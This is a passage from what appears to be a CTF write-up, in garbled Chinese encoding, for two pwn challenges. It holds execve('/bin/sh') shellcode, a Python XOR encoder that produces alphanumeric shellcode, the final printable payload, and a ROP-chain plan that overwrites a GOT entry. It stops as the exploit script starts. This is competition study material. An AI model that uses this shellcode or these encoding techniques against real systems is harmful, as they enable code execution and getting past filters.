å‡ºå¤§äº<code>0x7f</code>çš„å€¼</p><h3 id="0x02-å°äº0x7fæŒ‡ä»¤ï¼Œå†™å…¥shellcode">0x02 å°äº0x7fæŒ‡ä»¤ï¼Œå†™å…¥shellcode</h3><p>æˆ‘ä»¬æœ€ç»ˆç›®çš„æ˜¯å†™shellcodeå½“ä½œå‘½ä»¤æ‰§è¡Œï¼Œ</p><p>æˆ‘è¿™é‡Œæ‰¾äº†ä¸ª<code>64ä½ è¾ƒçŸ­çš„shellcode  23å­—èŠ‚</code></p><p><code>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</code></p><p>æœ‰ä¸‰ä¸ªå­—èŠ‚å¤§äº0x7f</p><p>å°äº<code>0x7f</code>çš„å­—èŠ‚å°±ç”¨å°äº0x7fçš„å‘½ä»¤æ­£å¸¸å†™å…¥<code>0x10000+0x200</code>åçš„åœ°å€ï¼Œå¤§äº0x7fçš„ä¸‰ä¸ªå­—èŠ‚ç”±<code>sub byte [rax+1],cl</code>æ¥æ„é€ å‡ºï¼Œå¹¶å†™å…¥æŒ‡å®šä½ç½®ã€‚</p><p>å¯ä»¥å†™å‡ºç”±å°äº0x7fçš„æŒ‡ä»¤ç»„æˆçš„æ±‡ç¼–ï¼šåŠŸèƒ½æ˜¯æŠŠ<code>shellcode</code>å†™åˆ°<code>0x10000+0x801</code>å¤„</p><p>(<code>\x00</code>ä¼šå½±å“è§£ææ±‡ç¼–ï¼Œæ‰€ä»¥å¾®è°ƒä¸‹ä½ç½®<code>0x801</code>,pushçš„ç«‹å³æ•°è¦åç€å¡«)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add ax,0x801<br>push 0x56003148<br>pop rcx<br>xor DWORD PTR [rax], ecx<br>push 0x622f0048<br>pop rcx<br>xor DWORD PTR [rax+0x4], ecx<br>push 0x2f2f6e69<br>pop rcx<br>xor DWORD PTR [rax+0x8], ecx<br>push 0x54576873<br>pop rcx<br>xor DWORD PTR [rax+0xc], ecx<br>push 0x583b6a5f<br>pop rcx<br>xor DWORD PTR [rax+0x10], ecx<br>push 0x050f00<br>pop rcx<br>xor DWORD PTR [rax+0x14], ecx<br>push 0xa<br>pop rcx<br>sub byte [rax+1],cl<br>push 0x41<br>pop rcx<br>sub byte [rax+4],cl<br>push 0x67<br>pop rcx<br>sub byte [rax+19],cl<br>sub ax,0x801<br></code></pre></td></tr></table></figure><h3 id="0x03-å¼‚æˆ–å‡ºå°äº0x7f">0x03 å¼‚æˆ–å‡ºå°äº0x7f</h3><p>ä¸Šé¢è¿™ä¸²æ±‡ç¼–å¯¹åº”å€¼ä¸º</p><p><code>\x66\x05\x01\x08\x68\x48\x31\x00\x56\x59\x31\x08\x68\x48\x00\x2F\x62\x59\x31\x48\x04\x68\x69\x6E\x2F\x2F\x59\x31\x48\x08\x68\x73\x68\x57\x54\x59\x31\x48\x0C\x68\x5F\x6A\x3B\x58\x59\x31\x48\x10\x68\x00\x0F\x05\x00\x59\x31\x48\x14\x6A\x0A\x59\x28\x48\x02\x6A\x41\x59\x28\x48\x05\x6A\x67\x59\x28\x48\x14\x66\x2D\x01\x08</code></p><p>æˆ‘ä»¬ç”¨æœ€åˆçš„xoræŒ‡ä»¤æ¥å¼‚æˆ–å‡ºï¼Œå¹¶å†™å…¥<code>0x10000+0x400</code>å¤„</p><p>ç…§ç€å®˜æ–¹wpçš„å°ç¨‹åºï¼Œæ¥è®¡ç®—ä¸€ä¸‹å¼‚æˆ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python">table=[<span class="hljs-number">0x31</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x4A</span>,<span class="hljs-number">0x4B</span>,<span class="hljs-number">0x4C</span>,<span class="hljs-number">0x4D</span>,<span class="hljs-number">0x4E</span>,<span class="hljs-number">0x4F</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x5A</span>]<br>table2=&#123;&#125;<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>():   <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> table:<br>            k=i^j<br>            <span class="hljs-keyword">if</span> k <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(table2.keys()):<br>                table2[k]=(i,j)<br>xor()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table2.keys():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i),end=<span class="hljs-string">&#x27;,&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> table2.keys():<br>        <span class="hljs-keyword">return</span> (table2[n])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find1</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table:<br>        j=i^n<br>        <span class="hljs-keyword">if</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(table2.keys()):<br>            <span class="hljs-keyword">return</span>(i,table2[j][<span class="hljs-number">0</span>],table2[j][<span class="hljs-number">1</span>])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_num</span>(<span class="hljs-params">n</span>):<br>    num1=(n)&amp;<span class="hljs-number">0xff</span><br>    num2=(n&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span><br>    num3=(n&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br>    num4=(n&gt;&gt;<span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xff</span><br>    n1=find(num1)<br>    n2=find(num2)<br>    n3=find(num3)<br>    n4=find(num4)<br>    <span class="hljs-keyword">if</span> n1!=<span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> n2!=<span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> n3!=<span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> n4!=<span class="hljs-literal">None</span> :<br>        ret1=n1[<span class="hljs-number">0</span>]+(n2[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">8</span>)+(n3[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">16</span>)+(n4[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">24</span>)<br>        ret2=n1[<span class="hljs-number">1</span>]+(n2[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+(n3[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">16</span>)+(n4[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">24</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor eax,&quot;</span>+<span class="hljs-built_in">hex</span>(ret1))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor eax,&quot;</span>+<span class="hljs-built_in">hex</span>(ret2))<br>        <span class="hljs-keyword">return</span><br>    num1=(n)&amp;<span class="hljs-number">0xff</span><br>    num2=(n&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span><br>    num3=(n&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span><br>    num4=(n&gt;&gt;<span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xff</span><br>    n1=find1(num1)<br>    n2=find1(num2)<br>    n3=find1(num3)<br>    n4=find1(num4)<br>    <span class="hljs-keyword">if</span> n1!=<span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> n2!=<span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> n3!=<span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> n4!=<span class="hljs-literal">None</span> :<br>        ret1=n1[<span class="hljs-number">0</span>]+(n2[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">8</span>)+(n3[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">16</span>)+(n4[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">24</span>)<br>        ret2=n1[<span class="hljs-number">1</span>]+(n2[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+(n3[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">16</span>)+(n4[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">24</span>)<br>        ret3=n1[<span class="hljs-number">2</span>]+(n2[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">8</span>)+(n3[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">16</span>)+(n4[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">24</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor eax,&quot;</span>+<span class="hljs-built_in">hex</span>(ret1))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor eax,&quot;</span>+<span class="hljs-built_in">hex</span>(ret2))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor eax,&quot;</span>+<span class="hljs-built_in">hex</span>(ret3))<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;not found&#x27;</span>)<br>xor_num(<span class="hljs-number">0x10440</span>^<span class="hljs-number">0x10000</span>)<br>p2=[<span class="hljs-number">0x66</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x2F</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x2F</span>,<span class="hljs-number">0x2F</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x0C</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x5F</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x3B</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x2D</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x00</span>]<br>a=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(p2),<span class="hljs-number">4</span>):<br>    num=p2[i]+(p2[i+<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+(p2[i+<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">16</span>)+(p2[i+<span class="hljs-number">3</span>]&lt;&lt;<span class="hljs-number">24</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(num))<br>    xor_num(a^num)<br>    a=num<br><br></code></pre></td></tr></table></figure><p>æœ€åé€ å‡º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push rdx<br>pop rax<br>xor eax,0x31313131<br>xor eax,0x31313531<br>push rax<br>pop rcx<br>xor eax,0x31423131<br>xor eax,0x31433531<br><br>xor eax,0x41424131<br>xor eax,0x49434457<br>xor DWORD PTR [rcx+0x42], eax<br><br>xor eax,0x31313135<br>xor eax,0x61423161<br>xor eax,0x58434d5a<br>xor DWORD PTR [rcx+0x46], eax<br><br>xor eax,0x31313131<br>xor eax,0x61616141<br>xor eax,0x5850414e<br>xor DWORD PTR [rcx+0x4a], eax<br><br>xor eax,0x31313131<br>xor eax,0x41316141<br>xor eax,0x5731414e<br>xor DWORD PTR [rcx+0x4e], eax<br><br>push rax<br>push rcx<br>pop rax<br>xor eax,0x31313141<br>xor eax,0x31313151<br>push rax<br>pop rcx<br>pop rax<br><br>xor eax,0x31614141<br>xor eax,0x5650504b<br>xor DWORD PTR [rcx+0x42], eax<br><br>xor eax,0x31313161<br>xor eax,0x41313141<br>xor eax,0x56583146<br>xor DWORD PTR [rcx+0x46], eax<br><br>xor eax,0x41313131<br>xor eax,0x44423142<br>xor eax,0x5a434758<br>xor DWORD PTR [rcx+0x4a], eax<br><br>xor eax,0x31313161<br>xor eax,0x31314141<br>xor eax,0x42315747<br>xor DWORD PTR [rcx+0x4e], eax<br><br>push rax<br>push rcx<br>pop rax<br>xor eax,0x31313161<br>xor eax,0x31313151<br>push rax<br>pop rcx<br>pop rax<br><br>xor eax,0x31314131<br>xor eax,0x41414441<br>xor eax,0x5a4c5a50<br>xor DWORD PTR [rcx+0x42], eax<br><br>xor eax,0x31313131<br>xor eax,0x31316131<br>xor eax,0x31584f59<br>xor DWORD PTR [rcx+0x46], eax<br><br>xor eax,0x31313161<br>xor eax,0x42414141<br>xor eax,0x4347524e<br>xor DWORD PTR [rcx+0x4a], eax<br><br>xor eax,0x31614131<br>xor eax,0x31414261<br>xor eax,0x48535856<br>xor DWORD PTR [rcx+0x4e], eax<br><br>push rax<br>push rcx<br>pop rax<br>xor eax,0x31313141<br>xor eax,0x31313151<br>push rax<br>pop rcx<br>pop rax<br><br>xor eax,0x31313131<br>xor eax,0x61313131<br>xor eax,0x45473131<br>xor DWORD PTR [rcx+0x42], eax<br><br>xor eax,0x31313161<br>xor eax,0x31413141<br>xor eax,0x4d4e5948<br>xor DWORD PTR [rcx+0x46], eax<br><br>xor eax,0x41616141<br>xor eax,0x505a5255<br>xor DWORD PTR [rcx+0x4a], eax<br><br>xor eax,0x31313131<br>xor eax,0x41614141<br>xor eax,0x4358524c<br>xor DWORD PTR [rcx+0x4e], eax<br><br>push rax<br>push rcx<br>pop rax<br>xor eax,0x31313131<br>xor eax,0x31313141<br>push rax<br>pop rcx<br>pop rax<br><br>xor eax,0x61614131<br>xor eax,0x434b5058<br>xor DWORD PTR [rcx+0x42], eax<br><br>xor eax,0x31313131<br>xor eax,0x61314131<br>xor eax,0x414f4344<br>xor DWORD PTR [rcx+0x46], eax<br><br>xor eax,0x31613131<br>xor eax,0x41414144<br>xor eax,0x4f535258<br>xor DWORD PTR [rcx+0x4a], eax<br><br>xor eax,0x61313131<br>xor eax,0x41613161<br>xor eax,0x464c4955<br>xor DWORD PTR [rcx+0x4e], eax<br><br>push rcx<br>pop rax<br>xor eax,0x31313531<br>xor eax,0x61616135<br>xor eax,0x50505044<br>push rax<br></code></pre></td></tr></table></figure><p>å‰©ä½™éšä¾¿æ‰¾ä¸ªå¡«å……åˆ°0x200ï¼Œè¿™é‡Œæ‰¾äº†Y</p><p>shellcodeè¿™ä¹ˆä¸€ä¸²</p><p><code>RX5111151511PY511B1515C151ABA5WDCI1AB551115a1Ba5ZMCX1AF511115Aaaa5NAPX1AJ511115Aa1A5NA1W1ANPQX5A1115Q111PYX5AAa15KPPV1AB5a1115A11A5F1XV1AF5111A5B1BD5XGCZ1AJ5a1115AA115GW1B1ANPQX5a1115Q111PYX51A115ADAA5PZLZ1AB5111151a115YOX11AF5a1115AAAB5NRGC1AJ51Aa15aBA15VXSH1ANPQX5A1115Q111PYX511115111a511GE1AB5a1115A1A15HYNM1AF5AaaA5URZP1AJ511115AAaA5LRXC1ANPQX511115A111PYX51Aaa5XPKC1AB5111151A1a5DCOA1AF511a15DAAA5XRSO1AJ5111a5a1aA5UILF1ANQX5151155aaa5DPPPPYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</code></p><p>getshell</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/get.png" alt="get"></p><h2 id="R-P">R()P</h2><p>ä¿æŠ¤æ²¡å¼€pieï¼Œgotè¡¨å¯å†™</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/%E9%A2%982%E4%BF%9D%E6%8A%A4.png" alt="é¢˜2ä¿æŠ¤"></p><p>é¢˜ç›®å­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡º</p><p>è¿™é¢˜æ˜¯é«˜ç‰ˆæœ¬çš„gccç¼–è¯‘çš„</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/2.34.png" alt="2.34"></p><p>æ²¡äº†å¸¸è§„çš„<code>pop rdi;ret</code>   <code>pop_rsi_r15</code>ï¼Œä¹Ÿæ²¡æœ‰äº†csuç­‰gadgetç”¨</p><p>ä¸»è¦æ˜¯å¦‚ä½•å»rop</p><h3 id="0x01èƒ½æ§åˆ¶çš„å‚æ•°">0x01èƒ½æ§åˆ¶çš„å‚æ•°</h3><p><strong>raxï¼š</strong> å¯ä»¥ç”±æ ˆä¸Šçš„å€¼æ§åˆ¶ï¼Œgdbè°ƒè¯•å¯å¾—æ˜¯ rsp+0xcå¤„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040116D                 mov     eax, dword ptr [rsp+18h+buf]<br>.text:0000000000401171                 add     rsp, 18h<br>.text:0000000000401175                 retn<br></code></pre></td></tr></table></figure><p><strong>rdi:</strong></p><p>å¯ä»¥ç”±_bss_startçš„åœ°å€å€¼æ§åˆ¶ï¼Œraxæˆ‘ä»¬å¯ä»¥äº‹å…ˆæ§åˆ¶ä¸ºretçš„åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0000000000401099                 mov     edi, offset __bss_start<br>.text:000000000040109E                 jmp     rax<br></code></pre></td></tr></table></figure><p><strong>rsiï¼š</strong></p><p>å¯ä»¥åœ¨è¦è°ƒç”¨readæ—¶äº‹å…ˆæ§åˆ¶å¥½raxï¼Œå°±èƒ½æ§åˆ¶rsi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040115A                 mov     rsi, rax        ; buf<br>.text:000000000040115D                 mov     edx, dword ptr [rsp+18h+buf] ; nbytes<br>.text:0000000000401161                 xor     edi, edi        ; fd<br>.text:0000000000401163                 mov     eax, 0<br>.text:0000000000401168                 call    _read<br>.text:000000000040116D                 mov     eax, dword ptr [rsp+18h+buf]<br>.text:0000000000401171                 add     rsp, 18h<br>.text:0000000000401175                 retn<br></code></pre></td></tr></table></figure><p><strong>rdxï¼š</strong></p><p>rdxåªæœ‰åœ¨è°ƒç”¨readå‰æœ‰ä¸€æ®µèµ‹å€¼ä¸ºæ ˆä¸Šçš„å€¼çš„æ“ä½œ</p><p>ä½†å¦‚æœæˆ‘ä»¬è¦readçš„è¯rdxä¹Ÿå°±æ˜¯é•¿åº¦ä¸èƒ½ä¸º0ï¼Œä½†æ˜¯è¦é€ çš„execveçš„å‚æ•°åªéœ€æ»¡è¶³ä½¿rdxä¸€ä¸ªåœ°å€æŒ‡å‘0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040115D                 mov     edx, dword ptr [rsp+18h+buf] ; nbytes<br></code></pre></td></tr></table></figure><h3 id="0x02-ROPæ€è·¯">0x02 ROPæ€è·¯</h3><p>æœ€åæˆ‘ä»¬è¦ropå‡º<code>execve('/bin/sh',0,0)</code></p><p>å‚æ•°:</p><p><code>rdi='/bin/sh'</code></p><p><code>rsi=0  or   åœ°å€-&gt;0</code></p><p><code>rdx=0 or  åœ°å€-&gt;0</code></p><p><strong>ROPé“¾ï¼š</strong></p><p>ä¿®æ”¹raxï¼Œæ”¹readçš„rsiä¸º_bss_startï¼Œï¼ˆreadçš„rdxæ§åˆ¶ä¸ºread_gotï¼‰,</p><p>è°ƒç”¨readï¼Œå†™å…¥/bin/shçš„åŒæ—¶ä¿®æ”¹raxä¸ºread_gotï¼Œæ”¹readçš„rsiä¸ºread_gotï¼Œï¼ˆreadçš„rdxæ§åˆ¶ä¸ºæŸä¸ªåœ°å€æŒ‡å‘0ï¼‰ï¼Œ</p><p>è°ƒç”¨readï¼Œæ”¹read_gotä¸ºsyscall+0x1bçš„åŒæ—¶æ”¹rdxä¸ºæŸä¸ªåœ°å€æŒ‡å‘0ï¼ˆæˆ‘æœ¬åœ°è°ƒsyscallå‰çš„0x1bç ´åäº†å¯„å­˜å™¨çš„å€¼,æ‰€ä»¥å¤šäº†0x1bï¼‰</p><p>ä¿®æ”¹raxï¼Œæ§åˆ¶rdiä¸º/bin/sh</p><p>ä¿®æ”¹raxä¸º0ï¼Œæ§åˆ¶rsiä¸º0</p><p>ç°åœ¨æˆ‘ä»¬æ§åˆ¶äº†:</p><p><code>read_got=syscall</code></p><p><code>rdi='/bin/sh'</code></p><p><code>rsi=0</code></p><p><code>rdx=åœ°å€-&gt;0</code></p><p>è°ƒç”¨readå³getshell</p><h3 id="0x03-æœ¬åœ°exp">0x03 æœ¬åœ°exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 